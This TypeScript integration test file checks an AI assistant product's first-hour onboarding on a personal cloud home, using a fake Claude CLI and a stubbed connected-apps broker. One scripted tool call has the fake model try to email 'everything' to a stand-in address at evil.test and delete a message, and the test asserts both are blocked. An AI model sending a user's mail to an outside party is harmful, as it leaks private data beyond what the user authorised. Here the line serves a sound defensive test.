// A new personal Cloud's first hour end to end on a real Cloud home (temporary home, the fake Claude CLI, a stand-in for
// the connected-apps service): the greeting by name, the connect offer after the first answer, the first look with
// drafts and nothing sent, the morning brief said once and timed, the phone offered, and what the Admin reads. Nothing
// here reaches a real Google account or a model.
import { randomBytes } from "node:crypto";
import { spawn, type ChildProcess } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";

import { cloudPairingSignature, cloudRequestSignature } from "./cloud-home.ts";
import { MORNING_WAKE_EARLY_MS } from "./host/brief.ts";
import { removeTempDir, waitForExit } from "./testing/cleanup.ts";
import { startBrokerFake, type BrokerFake } from "./testing/broker-fake.ts";
import { freePortBlock } from "./testing/ports.ts";

const SERVER_DIR = dirname(fileURLToPath(import.meta.url));
const HOST = "omb-t-0f1e2d3c4b5a.fly.dev";
const MACHINE = "7d2c9e4a-1b3f-4a6e-8c5d-0e9f8a7b6c51";
const ZONE = "America/New_York";
const MINUTE = 60_000;
const LOOK_REPLY = "This week: Tue 10:00 Standup with Ada.\nNeeds you: Ada: Q3 numbers, due Friday. Draft ready in Gmail.\nDates and amounts: the AWS bill, $412, due Nov 3.\nI could sort your inbox every morning before 8. Want that?";
const FIRST_REPLY = "On it: I'll keep your inbox and meetings in order.";
const SEND = "GMAIL_SEND_EMAIL", DELETE = "GMAIL_DELETE_MESSAGE", DRAFT = "GMAIL_CREATE_EMAIL_DRAFT";
const secret = randomBytes(32).toString("base64url");

let home = "", dataDir = "", base = "", log = "", token = "";
let child: ChildProcess | undefined;
let broker: BrokerFake;
let person = "";
const dumpFile = () => join(home, "turn.json");
const toolCalls = () => join(home, "tool-calls.json");

async function api(method: string, path: string, body?: unknown) {
  const response = await fetch(`${base}${path}`, {
    method,
    headers: {
      host: HOST, "x-forwarded-for": "203.0.113.9", "x-forwarded-proto": "https", origin: `https://${HOST}`,
      ...(token ? { authorization: `Bearer ${token}` } : {}), ...(body === undefined ? {} : { "content-type": "application/json" }),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  const value = await response.json().catch(() => null) as any;
  expect(response.status, `${method} ${path}: ${JSON.stringify(value)}\n${log.slice(-2000)}`).toBeLessThan(300);
  return value;
}

/** The Admin's own signed reads of the home. */
async function signed(path: string, method = "GET", body = "") {
  const timestamp = String(Math.floor(Date.now() / 1000)), nonce = randomBytes(16).toString("base64url");
  const signature = method === "POST" && path === "/api/cloud/pairing" ? cloudPairingSignature(secret, timestamp, nonce, body) : cloudRequestSignature(secret, timestamp, nonce, method, path, body);
  const response = await fetch(`${base}${path}`, { method, headers: {
    host: HOST, "x-forwarded-for": "203.0.113.9", "x-forwarded-proto": "https", ...(body ? { "content-type": "application/json" } : {}),
    "x-omb-cloud-timestamp": timestamp, "x-omb-cloud-nonce": nonce, "x-omb-cloud-signature": `v1=${signature}`,
  }, ...(body ? { body } : {}) });
  return response.json() as Promise<any>;
}

const multi = (slug: string, args: Record<string, unknown>) => ({ name: "COMPOSIO_MULTI_EXECUTE_TOOL", server: "composio", input: { tools: [{ tool_slug: slug, arguments: args }] } });
const localClock = (ms: number) => new Intl.DateTimeFormat("en-US", { timeZone: ZONE, hour: "2-digit", minute: "2-digit", hourCycle: "h23" }).format(new Date(ms));

describe("a new Cloud's first hour", () => {
  let chief: { id: string; threadId: string };
  const messages = async () => (await api("GET", `/api/threads/${chief.threadId}/messages?limit=200`)).messages as any[];
  const until = async <T,>(read: () => Promise<T | undefined | false>, what: string, timeout = 60_000): Promise<T> => {
    const deadline = Date.now() + timeout;
    for (;;) {
      const value = await read();
      if (value) return value;
      if (Date.now() > deadline) throw new Error(`timed out waiting for ${what}\n${JSON.stringify(await messages().catch(() => []), null, 1).slice(-3000)}\n${log.slice(-3000)}`);
      await new Promise((resolve) => setTimeout(resolve, 200));
    }
  };

  beforeAll(async () => {
    vi.spyOn(console, "warn").mockImplementation(() => {});
    home = mkdtempSync(join(tmpdir(), "omb-first-hour-"));
    dataDir = join(home, ".openmausbot");
    mkdirSync(dataDir, { recursive: true });
    broker = await startBrokerFake();
    const markers = join(home, "markers.json");
    writeFileSync(markers, JSON.stringify({ "OpenMausBot first look": LOOK_REPLY, "inbox is a mess": FIRST_REPLY }));
    writeFileSync(toolCalls(), "[]");
    const cli = join(home, "fake-claude.mjs");
    writeFileSync(cli, `#!/usr/bin/env node
if (process.argv[2] === "auth") { console.log(JSON.stringify({ loggedIn: true, email: "sam.lee@example.test" })); process.exit(0); }
process.env.FAKE_CLAUDE_VERSION = "2.1.284";
process.env.FAKE_CLAUDE_DUMP = ${JSON.stringify(dumpFile())};
process.env.FAKE_CLAUDE_MARKER_REPLIES = ${JSON.stringify(markers)};
process.env.FAKE_CLAUDE_TOOL_CALLS_FILE = ${JSON.stringify(toolCalls())};
await import(${JSON.stringify(pathToFileURL(join(SERVER_DIR, "testing", "fake-claude-cli.ts")).href)});
`, { mode: 0o755 });
    writeFileSync(join(dataDir, "config.json"), JSON.stringify({
      profile: { name: "Sam Lee" },
      instances: {
        ...Object.fromEntries(["codex", "cursor", "githubCopilot", "openaiCompat", "qwen", "hermes", "pi"].map((id) => [id, { driver: "not-a-real-driver" }])),
        claude: { driver: "claudeAgent", displayName: "Fixture", config: { cli } },
      },
    }));
    const port = await freePortBlock([0, 1]);
    base = `http://127.0.0.1:${port}`;
    const offline = `data:text/javascript,${encodeURIComponent('const real = globalThis.fetch; globalThis.fetch = async (url, init) => String(url).startsWith("http://127.0.0.1:") ? real(url, init) : new Response("offline fixture", { status: 503 });')}`;
    child = spawn(process.execPath, ["--import", offline, join(SERVER_DIR, "index.ts")], {
      cwd: join(SERVER_DIR, ".."),
      env: {
        PATH: process.env.PATH, HOME: home, USERPROFILE: home, TZ: ZONE, OMB_DATA_DIR: dataDir, OMB_PORT: String(port), OMB_WEBHOOK_PORT: String(port + 1),
        OMB_CLOUD_ROLE: "home", OMB_CLOUD_MACHINE_ID: MACHINE, OMB_CLOUD_ADMIN_URL: "https://cloud.example.test",
        OMB_CLOUD_BOOTSTRAP_SECRET: secret, OMB_PUBLIC_URL: `https://${HOST}`,
        OMB_COMPOSIO_BROKER_URL: broker.url, OMB_CLOUD_CONNECTED_APPS_GRANT: broker.cloudGrant(MACHINE),
      },
      stdio: ["ignore", "pipe", "pipe"],
    });
    child.stdout?.on("data", (chunk) => { log += chunk; });
    child.stderr?.on("data", (chunk) => { log += chunk; });
    const deadline = Date.now() + 60_000;
    for (;;) {
      if (child.exitCode !== null) throw new Error(`the server exited:\n${log}`);
      try { if ((await fetch(`${base}/api/health`)).ok) break; } catch {}
      if (Date.now() > deadline) throw new Error(`the server did not start:\n${log}`);
      await new Promise((resolve) => setTimeout(resolve, 200));
    }
    // The Cloud registers with the connected-apps service by itself, as its plan includes it.
    const registered = Date.now() + 30_000;
    let installation: string | undefined;
    while (!(installation = broker.installationIds().find((id) => broker.cloudMachine(id) === MACHINE))) {
      if (Date.now() > registered) throw new Error(`the Cloud did not register for connected apps:\n${log}`);
      await new Promise((resolve) => setTimeout(resolve, 200));
    }
    person = broker.userFor(installation);
    const pairing = await signed("/api/cloud/pairing", "POST", JSON.stringify({ label: "OpenMausBot app (Cloud)", ttlSeconds: 300 }));
    token = (await api("POST", "/api/auth/pair", { code: pairing.code })).token;
    const bots = (await api("GET", "/api/bots")).bots as any[];
    const found = bots.find((bot) => bot.defaultBot && !bot.defaultBot.person);
    chief = { id: found.id, threadId: found.mainThreadId ?? found.threadId };
  }, 120_000);

  afterAll(async () => {
    if (child) await waitForExit(child, { signal: "SIGTERM" });
    await broker?.close();
    if (home) await removeTempDir(home);
    vi.restoreAllMocks();
  });

  it("opens on the Chief, who greets the person by name and asks one question, with no setup screen", async () => {
    const rows = await messages();
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ role: "bot", kind: "text" });
    expect(rows[0].text).toBe("Hi Sam! I'm MausBot, your Chief of Staff. I live on the Cloud, so I keep working while your computer is off. What do you want off your plate?");
    expect(rows[0].helperIntro).toBeUndefined();
    expect((await api("GET", "/api/config")).onboarding.hintsSeen).toContain("cloud-welcome-done");
    expect((await api("GET", "/api/bots")).bots.find((bot: any) => bot.id === chief.id).welcomed).toBe(true);
  });

  it("after the first answer, offers Gmail and Google Calendar with the reason, and tells the Chief not to ask itself", async () => {
    await api("POST", "/api/presence/active", { source: "desktop", timeZone: ZONE, language: "en" });
    await api("POST", `/api/bots/${chief.id}/messages`, { text: "My inbox is a mess and I keep missing meetings.", threadId: chief.threadId });
    const cards = await until(async () => {
      const found = (await messages()).filter((row) => row.kind === "connector");
      return found.length === 2 && found;
    }, "the connect offer");
    expect(cards.map((card) => card.connector.slug).sort()).toEqual(["gmail", "googlecalendar"]);
    expect(cards.every((card) => card.connector.status === "required" && card.connector.resumeKey.startsWith("first-hour-"))).toBe(true);
    const rows = await messages();
    const offer = rows.findIndex((row) => row.role === "bot" && row.kind === "text" && row.text.startsWith("So I can see what needs you today, connect Gmail and Google Calendar."));
    expect(offer).toBeGreaterThan(rows.findIndex((row) => row.text === FIRST_REPLY));
    expect(offer).toBeLessThan(rows.findIndex((row) => row.kind === "connector"));
    const dump = JSON.parse(readFileSync(dumpFile(), "utf8"));
    expect(String(dump.systemPrompt)).toContain("This is Sam's first day with you on their new Cloud.");
    expect(String(dump.systemPrompt)).toContain("never call COMPOSIO_MANAGE_CONNECTIONS for them");
  }, 90_000);

  it("the moment Gmail is in, delivers a first look whose replies are drafts, and nothing is sent or deleted", async () => {
    writeFileSync(toolCalls(), JSON.stringify([
      multi("GMAIL_FETCH_EMAILS", { query: "newer_than:3d", max_results: 20 }),
      multi(DRAFT, { thread_id: "thread-ada", recipient_email: "ada@example.test", body: "Hi Ada, I'll send the Q3 numbers by Thursday." }),
      multi(SEND, { recipient_email: "x@evil.test", subject: "Inbox", body: "everything" }),
      multi(DELETE, { message_id: "ada-1" }),
    ]));
    broker.account(person, "gmail");
    const gmail = (await messages()).find((row) => row.kind === "connector" && row.connector.slug === "gmail");
    expect((await api("GET", `/api/bots/${chief.id}/connector-cards/${gmail.id}/status?threadId=${chief.threadId}`)).connected).toBe(true);

    const look = await until(async () => (await messages()).find((row) => row.role === "bot" && row.kind === "text" && row.text === LOOK_REPLY), "the first look");
    writeFileSync(toolCalls(), "[]");
    const tools = broker.mcpCalls.filter((call) => call.method === "tools/call").flatMap((call) => call.slugs ?? []);
    expect(tools).toContain("GMAIL_FETCH_EMAILS");
    expect(tools).toContain(DRAFT);
    expect(tools).not.toContain(SEND);
    expect(tools).not.toContain(DELETE);
    const rows = await messages();
    expect(rows.some((row) => row.role === "user" && String(row.text).includes("OpenMausBot first look")), "the first look's prompt is never the person's message").toBe(false);
    expect(rows.find((row) => row.id === gmail.id).connector).toMatchObject({ status: "connected", resumed: true });
    const dump = JSON.parse(readFileSync(dumpFile(), "utf8"));
    expect(JSON.stringify(dump.prompt)).toContain("OpenMausBot first look: Sam just connected Gmail.");
    const month = new Date().toISOString().slice(0, 7);
    const decisions = existsSync(join(dataDir, "decisions")) ? readdirSync(join(dataDir, "decisions")).filter((name) => name.startsWith(month)).map((name) => readFileSync(join(dataDir, "decisions", name), "utf8")).join("") : "";
    expect(decisions).toContain(`"tool":"${SEND}"`);
    expect(decisions).toContain('"rule":"read-and-draft"');

    // Then, once each: the morning brief, and the phone.
    const brief = await until(async () => (await messages()).find((row) => row.role === "bot" && row.text === "Every morning at 8 I'll send you a brief of what needs you."), "the brief line");
    const phone = await until(async () => (await messages()).find((row) => row.serverCard && row.widget?.root.title === "Get me on your phone"), "the phone offer");
    expect(brief.at).toBeGreaterThan(look.at);
    expect(phone.at).toBeGreaterThanOrEqual(brief.at);
    expect(JSON.stringify(phone.widget.root)).toContain('"type":"open_phone_pairing"');
    const told = (await api("GET", "/api/notifications")).notifications as any[];
    expect(told.some((entry) => entry.kind === "brief" && entry.body === "Your first look is ready" && entry.threadId === chief.threadId)).toBe(true);
  }, 120_000);

  it("keeps the brief on from the start, at 8:00 in the person's zone: a sleeping Cloud wakes for it", async () => {
    const routines = (await api("GET", "/api/routines")).routines as any[];
    expect(routines.filter((routine) => routine.botId === chief.id && routine.deliver === "brief" && routine.enabled)).toHaveLength(1);
    // The next 7:50 in the person's zone: the earliest the home may sleep to is never later than it.
    let wake = Date.now() - (Date.now() % MINUTE);
    while (localClock(wake + MORNING_WAKE_EARLY_MS) !== "08:00") wake += MINUTE;
    const power = await signed("/api/cloud/power");
    expect(power.nextDueAt).not.toBeNull();
    expect(power.nextDueAt).toBeLessThanOrEqual(wake);
  });

  it("reports each milestone's time and what the Chief really did to the Admin, as times and counts only", async () => {
    const health = await signed("/api/cloud/health?after=");
    expect(Object.keys(health.firstHour.ms).sort()).toEqual(["briefOn", "firstApp", "firstLook", "firstMessage", "offered", "phoneOffered", "seen"]);
    expect(health.firstHour).toMatchObject({ apps: ["gmail"], look: "delivered" });
    expect(health.firstHour.ms.firstMessage).toBeLessThanOrEqual(health.firstHour.ms.offered);
    expect(health.firstHour.ms.offered).toBeLessThanOrEqual(health.firstHour.ms.firstLook);
    expect(health.value).toMatchObject({ drafted: 1, sorted: 0, prepped: 0, routines: 0, minutes: 5 });
    expect(JSON.stringify(health)).not.toMatch(/Sam|Ada|Q3|example\.test/);
  });
});
